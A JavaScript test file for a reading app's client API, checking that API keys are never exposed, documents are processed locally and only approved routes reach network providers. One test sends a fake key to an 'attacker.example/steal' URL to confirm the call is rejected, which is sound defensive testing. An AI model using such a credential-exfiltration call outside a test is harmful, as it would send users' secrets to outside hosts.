import test from 'node:test';
import assert from 'node:assert/strict';
import { createClientAPI } from '../reader/static/client-api.js';
import { SessionCredentials } from '../reader/static/session-credentials.js';

const KEY = 'FAKE_TEST_KEY';
const demoData = { TEXT: 'The river flows.', TITLE: 'Demo', GLOSSARY: { river: ['人工詞義', 'An example.', 'A river picture.'] }, TRANSLATIONS: { 'The river flows.': '人工句子翻譯' } };
function setup(t, options = {}) {
  const credentials = new SessionCredentials({ scope: new EventTarget() });
  const calls = [], docs = [], translated = [], images = [];
  const api = createClientAPI({
    runtime: 'browser', credentials, demoData,
    fetchImpl: async (...args) => { calls.push(args); throw new Error('unexpected network call'); },
    documents: {
      makeDocument: async (...args) => { docs.push(args); return { id: 'text', source: args[2] }; },
      extractUpload: async (...args) => { docs.push(args); return { id: 'upload' }; },
    },
    translator: { status: { ready: false }, explain: async input => { translated.push(input); return {}; } },
    provider: { image: async (...args) => { images.push(args); return { image_url: 'https://images.example.com/a.png' }; }, destroy() {} },
    ...options,
  });
  t.after(() => { api.destroy(); credentials.destroy(); });
  return { api, credentials, calls, docs, translated, images };
}

test('static configuration and all credential routes make no network requests and expose no secrets', async t => {
  const h = setup(t);
  let config = await h.api('/api/config');
  assert.equal(config.ai_available, false); assert.equal(config.image_available, false);
  const snapshot = await h.api('/api/settings/tokenhub', { body: { api_key: KEY } });
  assert.equal(snapshot.configured, true); assert.equal(JSON.stringify(snapshot).includes(KEY), false);
  assert.equal((await h.api('/api/settings/tokenhub')).configured, true);
  config = await h.api('/api/config');
  assert.equal(config.image_available, true); assert.equal(config.image_provider, 'tokenhub');
  assert.equal(JSON.stringify(config).includes(KEY), false);
  await h.api('/api/settings/tokenhub', { method: 'DELETE' });
  assert.equal((await h.api('/api/config')).image_available, false);
  assert.equal(h.calls.length, 0);
});

test('local runtime reads only safe capability flags and never adopts legacy environment cloud settings', async t => {
  const calls = [];
  const h = setup(t, { runtime: 'local', fetchImpl: async (...args) => {
    calls.push(args);
    return new Response(JSON.stringify({ ai_available: true, image_available: true, image_provider: 'cloud', offline_available: true, speech_available: true, api_key: KEY }));
  } });
  const config = await h.api('/api/config');
  assert.equal(config.ai_available, false); assert.equal(config.image_available, false);
  assert.equal(config.image_provider, 'tokenhub'); assert.equal(config.offline_available, true);
  assert.equal(config.speech_available, true); assert.equal(JSON.stringify(config).includes(KEY), false);
  assert.equal(calls.length, 1); assert.equal(calls[0][0], '/api/config');
  await h.api('/api/settings/tokenhub', { body: { api_key: KEY } });
  await h.api('/api/settings/tokenhub', { method: 'DELETE' });
  assert.equal(calls.length, 1, 'settings must never reach the local legacy settings API');
});

for (const runtime of ['browser', 'local']) {
  test(`${runtime} document text, demo, and uploads are parsed inside browser with cancellation signals`, async t => {
    const h = setup(t, { runtime });
    const abort = new AbortController();
    await h.api('/api/demo', { signal: abort.signal });
    await h.api('/api/documents/text', { body: { text: 'Private document.', title: 'Private' }, signal: abort.signal });
    const file = { name: 'private.pdf' };
    await h.api('/api/documents/upload', { body: { get: key => key === 'file' ? file : undefined }, signal: abort.signal });
    assert.deepEqual(h.docs[0].slice(0, 3), [demoData.TEXT, demoData.TITLE, 'demo']);
    assert.equal(h.docs[0][3].signal, abort.signal);
    assert.deepEqual(h.docs[1].slice(0, 3), ['Private document.', 'Private', 'text']);
    assert.equal(h.docs[1][3].signal, abort.signal);
    assert.equal(h.docs[2][0], file); assert.equal(h.docs[2][1].signal, abort.signal);
    assert.equal(h.calls.length, 0);
  });
}

test('dictionary and authored demo translations work with no translator download or network', async t => {
  const h = setup(t);
  const known = await h.api('/api/explain', { body: { word: 'river', sentence: 'The river flows.', use_ai: false } });
  assert.equal(known.source, 'demo'); assert.equal(known.meaning, '人工詞義'); assert.equal(known.translation, '人工句子翻譯');
  const dictionary = await h.api('/api/explain', { body: { word: 'river', sentence: 'A different river.' } });
  assert.equal(dictionary.source, 'dictionary'); assert.equal(dictionary.translation, '');
  const unknown = await h.api('/api/explain', { body: { word: 'unknown', sentence: 'Something unknown.' } });
  assert.equal(unknown.source, 'unavailable'); assert.equal(unknown.meaning, '');
  const inherited = await h.api('/api/explain', { body: { word: 'constructor', sentence: 'constructor' } });
  assert.equal(inherited.source, 'unavailable'); assert.equal(inherited.translation, '');
  assert.equal(h.translated.length, 0); assert.equal(h.calls.length, 0);
});

test('an explicitly prepared browser translator takes priority over Python and preserves curated meanings', async t => {
  const translated = [];
  const h = setup(t, { runtime: 'local', translator: {
    status: { ready: true }, explain: async input => { translated.push(input); return { meaning: '模型詞義', translation: '模型句子翻譯', source: 'offline' }; },
  } });
  const result = await h.api('/api/explain', { body: { word: 'river', sentence: 'Another river flows.' } });
  assert.equal(result.meaning, '人工詞義'); assert.equal(result.translation, '模型句子翻譯'); assert.equal(result.source, 'offline');
  assert.equal(translated.length, 1); assert.equal(h.calls.length, 0);
  const demo = await h.api('/api/explain', { body: { word: 'river', sentence: 'The river flows.' } });
  assert.equal(demo.translation, '人工句子翻譯'); assert.equal(demo.source, 'demo');
  assert.equal(translated.length, 1);
});

test('local Python explanation receives only word and sentence with cloud use explicitly false', async t => {
  const calls = [];
  const h = setup(t, { runtime: 'local', fetchImpl: async (...args) => {
    calls.push(args); return new Response(JSON.stringify({ word: 'river', meaning: '本機詞義', translation: '本機翻譯', source: 'offline' }));
  } });
  h.credentials.update({ api_key: KEY });
  const result = await h.api('/api/explain', { body: { word: 'river', sentence: 'The river flows.', reason: 'dwell', api_key: 'IGNORED_FAKE' } });
  assert.equal(result.source, 'offline'); assert.equal(calls[0][0], '/api/explain');
  assert.deepEqual(JSON.parse(calls[0][1].body), { word: 'river', sentence: 'The river flows.', use_ai: false });
  assert.equal(JSON.stringify(calls).includes(KEY), false);
});

test('cloud text, unknown routes, and pre-aborted requests cannot dispatch provider operations', async t => {
  const h = setup(t); h.credentials.update({ api_key: KEY });
  await assert.rejects(h.api('/api/explain', { body: { word: 'river', sentence: 'The river flows.', use_ai: true } }), /本機/);
  await assert.rejects(h.api('https://attacker.example/steal', { body: { api_key: KEY } }), /不支援/);
  const abort = new AbortController(); abort.abort();
  await assert.rejects(h.api('/api/image', { body: { word: 'river', sentence: 'The river flows.', use_ai: true }, signal: abort.signal }), { name: 'AbortError' });
  assert.equal(h.images.length, 0); assert.equal(h.calls.length, 0);
});

test('only explicit image route forwards a request to the direct provider', async t => {
  const h = setup(t);
  const body = { word: 'river', sentence: 'The river flows.', use_ai: true };
  const abort = new AbortController();
  await h.api('/api/image', { body, signal: abort.signal });
  assert.deepEqual(h.images[0], [body, { signal: abort.signal }]);
  assert.equal(h.calls.length, 0);
});
